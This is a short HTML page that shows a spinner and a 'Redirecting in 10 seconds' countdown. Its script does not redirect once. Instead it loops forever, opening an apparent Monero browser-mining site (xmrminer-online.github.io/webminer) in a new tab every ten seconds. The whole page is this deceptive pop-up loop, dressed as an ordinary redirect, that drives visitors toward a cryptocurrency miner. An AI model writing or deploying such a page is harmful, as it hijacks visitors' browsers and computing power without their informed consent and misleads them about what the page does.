<html lang="en">

  <style>
    body {
      font-family: Arial, sans-serif;
      text-align: center;
      margin-top: 100px;
    }
    /* Spinner style */
    #spinner {
      margin: 0 auto;
      width: 120px;
      height: 120px;
      border: 16px solid #f3f3f3;
      border-top: 16px solid #3498db;
      border-radius: 50%;
      animation: spin 2s linear infinite;
    }
    @keyframes spin {
      0% { transform: rotate(0deg); }
      100% { transform: rotate(360deg); }
    }
    #countdown {
      font-size: 24px;
      margin-top: 20px;
    }
  </style>
</head>
<body>
  <!-- Loading spinner -->
  <div id="spinner"></div>
  
  <!-- Countdown display -->
  <div id="countdown" style="display:none;">
    Redirecting in <span id="timer">10</span> seconds...
  </div>
  
  <script>
    // Show spinner for 3 seconds, then start the countdown
    setTimeout(function() {
      document.getElementById('spinner').style.display = 'none';
      document.getElementById('countdown').style.display = 'block';
      
      var timeLeft = 10;
      // Update countdown every second and open new tab every 10 seconds
      setInterval(function() {
        timeLeft--;
        document.getElementById('timer').textContent = timeLeft;
        if (timeLeft <= 0) {
          // Open the specified URL in a new tab
          window.open("https://xmrminer-online.github.io/webminer/", '_blank');
          timeLeft = 10; // Reset the countdown
        }
      }, 1000);
    }, 3000); // 3-second spinner delay
  </script>
</body>
</html>
